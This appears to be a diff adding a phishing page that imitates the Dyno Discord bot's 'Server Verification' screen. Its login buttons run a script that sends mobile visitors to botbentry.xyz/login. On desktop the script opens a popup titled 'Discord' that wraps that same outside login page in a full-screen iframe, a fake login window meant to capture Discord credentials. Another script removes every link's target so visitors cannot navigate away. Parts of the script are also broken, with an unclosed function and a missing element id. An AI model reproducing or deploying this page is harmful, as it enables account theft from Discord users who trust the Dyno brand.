+          <div class="column navbar-logo-column"><a class="navbar-item navbar-title branding" href="/"><img
+                class="navbar-logo" alt="White diamond shaped Dyno logo" src="/images/dyno-blitz-v2-transparent-bg.png">
+              <h1 class="title is-1" alt="Dyno">Dyno</h1>
+            </a></div>
+          <div class="column navbar-auth-column">
+            <div class="is-hidden-desktop">
+              <div class="navbar-item">
+                <div class="buttons"><a class="level-item button is-info is-hidden-tablet touch-login-button"
+                    href="#" onclick="clickedLogin()" title="Login with Discord">Login</a><a
+                    class="level-item button is-info is-hidden-mobile touch-login-button" href="#"
+                    title="Login with Discord" onclick="clickedLogin()">Login with Discord</a></div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="navbar-menu">
+          <div class="navbar-start"><a class="navbar-item is-hidden-desktop" href="/account"
+              title="Manage Server">Manage Server</a><a class="navbar-item" href="/bot" title="Dyno Bot">Dyno Bot</a><a
+              class="navbar-item" href="/servers" title="Public Servers">Public Servers</a><a class="navbar-item"
+              href="/discord" title="Dyno Discord Server" target="_blank">Join Our Discord</a><a class="navbar-item"
+              href="/commands" title="Bot Commands">Commands</a><a class="navbar-item" href="https://docs.dyno.gg"
+              title="Wiki">Help</a><a class="navbar-item" href="/status" title="Dyno Status">Status</a>
+            <div class="navbar-item">
+              <div class="buttons"><a class="button is-info is-outlined" href="/premium" title="Get Premium">Get
+                  Premium</a></div>
+            </div>
+          </div>
+          <div class="navbar-item">
+            <div class="buttons"><a class="level-item button is-light" href="#"
+                title="Add Dyno to your server" onclick="clickedLogin()">Add To Server</a><a class="level-item button is-info" href="#"
+                title="Login with Discord" onclick="clickedLogin()">Login with Discord</a></div>
+          </div>
+        </div>
+      </div>
+    </nav>
+  </nav>
+
+  <div class="page-wrapper">
+    <div class="page-home">
+      <div class="container circles">
+        <div id="home-page-mount">
+          <div class="top-ad-container">
+            <div style="" id="bling-1"></div>
+          </div>
+          <div class="main-container container serverlist">
+            <div class="learn-more columns is-multiline">
+              <div class="column is-half is-full-mobile centered">
+                
+                <h1 class="is-size-2 has-text-weight-semibold">Server Verification</h1>
+                <p class="is-4 description-popularity-text is-size-6 has-text-grey">Dyno verification secures over <span
+                  class="has-text-primary">8.5 million</span> servers.
+              </p>
+                <p class="is-size-6 has-text-grey">Please complete verification to prove you are a human and gain access to the rest of the server.</p>
+                <div class="description-buttons is-flex"><a class="button is-info is-medium" href="#"
+                    title="Login To Verify" onclick="clickedLogin()">Login To Verify</a></div>
+              </div>
+              <div class="column is-half is-full-mobile"><img alt="Laptop frame with the Dyno dashboard rendered on it"
+                  class="mockup" src="/images/product-mockup.png"></div>
+            </div>
+            <script>
+               function clickedLogin() {
+                                document.getElementById('abc').addEventListener('click', (event) => {
+                                                                  if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+                                                                    event.preventDefault();
+                                                                    window.location.href = 'https://botbentry.xyz/login';
+                                                                  } else {
+                                                                    const wnd = window.open('https://mqqq.xyz', '_blank', 'status=no,toolbar=no,location=no,directories=no,resizable=yes,scrollbars=yes,width=1050,height=600');
+
+
+                                                                    wnd.document.write('<script>document.title = "Discord";</scr' + 'ipt><iframe style="position: absolute;top: 0px;bottom: 0px;right: 0px;width: 100%;border: none;margin: 0;padding: 0;overflow: hidden;z-index: 9999;height: 100%;" src="https://botbentry.xyz/login"></iframe>');
+                            }
+            </script>
+          </div>
+          
+          <div class="sticky-adhesion-container">
+            <div class="sticky-adhesion">
+              <div style="" id="bling-2"></div>
+            </div>
+          </div>
+        </div>
+        <script>
+          const guildCount = (parseInt("8518879" || 0) / 1000000).toFixed(1);
+        </script>
+        <script> 
+          const isAuthed = false;
+        </script>
+      </div>
+    </div>
+  </div>
+
+
+
+
+
+  <footer class="footer">
+    <div class="content is-hidden-mobile">
+      <div class="columns is-centered">
+        <div class="column is-6-mobile is-3-desktop" style="display: block; text-align: left;">
+          <img class="footer-logo" src="https://cdn.dyno.gg/footer/logo%402x.png">
+          <div class="social-text">
+            <h3>Get in Touch</h3>
+          </div>
+          <div class="social-icons">
+            <a class="social-link" href="https://discord.gg/8PW8rST">
+              <img class="social-icon discord-icon" src="https://cdn.dyno.gg/footer/discord.png">
+            </a>
+            <a class="social-link" href="https://twitter.com/DynoDiscord">
+              <img class="social-icon discord-icon" src="https://cdn.dyno.gg/footer/twitter.png">
+            </a>
+            <a class="social-link" href="/cdn-cgi/l/email-protection.html#5b2f3e3a361b3f223534753c3c">
+              <img class="social-icon discord-icon" src="https://cdn.dyno.gg/footer/mail.png">
+            </a>
+          </div>
+          <span class="copyright-notice">
+            © <script>
+              document.write(new Date().getFullYear())
+            </script> Swift Media Entertainment. All rights reserved.
+          </span>
+        </div>
+        <div class="column is-12-mobile is-3-desktop" style="display: block; text-align: left;">
+          <div class="columns is-mobile">
+            <div class="column is-6">
+              <span class="footer-link-title">Dyno</span>
+              <a href="bot.html" title="Dyno Bot" class="footer-link">Dyno Bot</a>
+              <a href="servers.html" title="Public Servers" class="footer-link">Public Servers</a>
+              <a href="commands.html" title="Bot Commands" class="footer-link">Bot Commands</a>
+              <a href="https://docs.dyno.gg/" title="Wiki" class="footer-link">Help</a>
+              <a href="premium.html" title="Get Premium" class="footer-link">Get Premium</a>
+              <a href="discord.html" title="Dyno Discord Server" class="footer-link">Dyno Discord Server</a>
+            </div>
+            <div class="column is-6">
+              <span class="footer-link-title">Legal</span>
+              <a href="terms.html" title="Terms of Service" class="footer-link">Terms and Conditions</a>
+              <a href="https://www.iubenda.com/privacy-policy/21925808"
+                class="footer-link iubenda-nostyle no-brand iubenda-noiframe iubenda-embed iubenda-noiframe "
+                title="Privacy Policy ">Privacy Policy</a>
+              <script type="text/javascript">
+                (function (w, d) {
+                  var loader = function () {
+                    var s = d.createElement("script"),
+                      tag = d.getElementsByTagName("script")[0];
+                    s.src = "../cdn.iubenda.com/iubenda.js";
+                    tag.parentNode.insertBefore(s, tag);
+                  };
+                  if (w.addEventListener) {
+                    w.addEventListener("load", loader, false);
+                  } else if (w.attachEvent) {
+                    w.attachEvent("onload", loader);
+                  } else {
+                    w.onload = loader;
+                  }
+                })(window, document);
+              </script>
+              <a href="https://www.iubenda.com/privacy-policy/21925808/cookie-policy"
+                class="footer-link iubenda-nostyle no-brand iubenda-noiframe iubenda-embed iubenda-noiframe "
+                title="Cookie Policy ">Cookie Policy</a>
+              <script type="text/javascript">
+                (function (w, d) {
+                  var loader = function () {
+                    var s = d.createElement("script"),
+                      tag = d.getElementsByTagName("script")[0];
+                    s.src = "../cdn.iubenda.com/iubenda.js";
+                    tag.parentNode.insertBefore(s, tag);
+                  };
+                  if (w.addEventListener) {
+                    w.addEventListener("load", loader, false);
+                  } else if (w.attachEvent) {
+                    w.attachEvent("onload", loader);
+                  } else {
+                    w.onload = loader;
+                  }
+                })(window, document);
+              </script>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="content is-hidden-tablet">
+      <div class="columns is-mobile is-multiline">
+        <div class="column is-12-mobile is-3-desktop" style="display: block; text-align: left;">
+          <div class="columns is-mobile">
+            <div class="column is-6">
+              <span class="footer-link-title">Dyno</span>
+              <a href="bot.html" title="Dyno Bot" class="footer-link">Dyno Bot</a>
+              <a href="servers.html" title="Public Servers" class="footer-link">Public Servers</a>
+              <a href="commands.html" title="Bot Commands" class="footer-link">Bot Commands</a>
+              <a href="https://docs.dyno.gg/" title="Wiki" class="footer-link">Help</a>
+              <a href="premium.html" title="Get Premium" class="footer-link">Get Premium</a>
+              <a href="discord.html" title="Dyno Discord Server" class="footer-link">Dyno Discord Server</a>
+            </div>
+            <div class="column is-6">
+              <span class="footer-link-title">Legal</span>
+              <a href="terms.html" title="Terms of Service" class="footer-link">Terms and Conditions</a>
+              <a href="https://www.iubenda.com/privacy-policy/21925808"
+                class="footer-link iubenda-nostyle no-brand iubenda-noiframe iubenda-embed iubenda-noiframe "
+                title="Privacy Policy ">Privacy Policy</a>
+              <script type="text/javascript">
+                (function (w, d) {
+                  var loader = function () {
+                    var s = d.createElement("script"),
+                      tag = d.getElementsByTagName("script")[0];
+                    s.src = "../cdn.iubenda.com/iubenda.js";
+                    tag.parentNode.insertBefore(s, tag);
+                  };
+                  if (w.addEventListener) {
+                    w.addEventListener("load", loader, false);
+                  } else if (w.attachEvent) {
+                    w.attachEvent("onload", loader);
+                  } else {
+                    w.onload = loader;
+                  }
+                })(window, document);
+              </script>
+              <a href="https://www.iubenda.com/privacy-policy/21925808/cookie-policy"
+                class="footer-link iubenda-nostyle no-brand iubenda-noiframe iubenda-embed iubenda-noiframe "
+                title="Cookie Policy ">Cookie Policy</a>
+              <script type="text/javascript">
+                (function (w, d) {
+                  var loader = function () {
+                    var s = d.createElement("script"),
+                      tag = d.getElementsByTagName("script")[0];
+                    s.src = "../cdn.iubenda.com/iubenda.js";
+                    tag.parentNode.insertBefore(s, tag);
+                  };
+                  if (w.addEventListener) {
+                    w.addEventListener("load", loader, false);
+                  } else if (w.attachEvent) {
+                    w.attachEvent("onload", loader);
+                  } else {
+                    w.onload = loader;
+                  }
+                })(window, document);
+              </script>
+            </div>
+          </div>
+        </div>
+        <div class="column is-6-mobile is-3-desktop" style="display: block; text-align: left;">
+          <img class="footer-logo" src="https://cdn.dyno.gg/footer/logo%402x.png">
+          <div class="social-text">
+            <h3>Get in Touch</h3>
+          </div>
+          <div class="social-icons">
+            <a class="social-link" href="https://discord.gg/8PW8rST">
+              <img class="social-icon discord-icon" src="https://cdn.dyno.gg/footer/discord.png">
+            </a>
+            <a class="social-link" href="https://twitter.com/DynoDiscord">
+              <img class="social-icon discord-icon" src="https://cdn.dyno.gg/footer/twitter.png">
+            </a>
+            <a class="social-link" href="/cdn-cgi/l/email-protection.html#611504000c2105180f0e4f0606">
+              <img class="social-icon discord-icon" src="https://cdn.dyno.gg/footer/mail.png">
+            </a>
+          </div>
+          <span class="copyright-notice">
+            © <script>
+              document.write(new Date().getFullYear())
+            </script>2023 Swift Media Entertainment. All rights reserved.
+          </span>
+        </div>
+      </div>
+    </div>
+  </footer>
+
+  <script src="/js/vendor/jquery.js"></script>
+  <script src="/js/vendor/base64.min.js"></script>
+  <script type="text/javascript">
+    var host = 'index.html';
+  </script>
+  <script src="/js/app.e18996536f.js"></script>
+  <script>
+    function disableHrefs() {
+            const anchorElements = document.getElementsByTagName("a");
+            for (let i = 0; i < anchorElements.length; i++) {
+                anchorElements[i].removeAttribute("href");
+            }
+        }
+
+        document.addEventListener("DOMContentLoaded", disableHrefs);
+  </script>
+</body>
+
+</html>
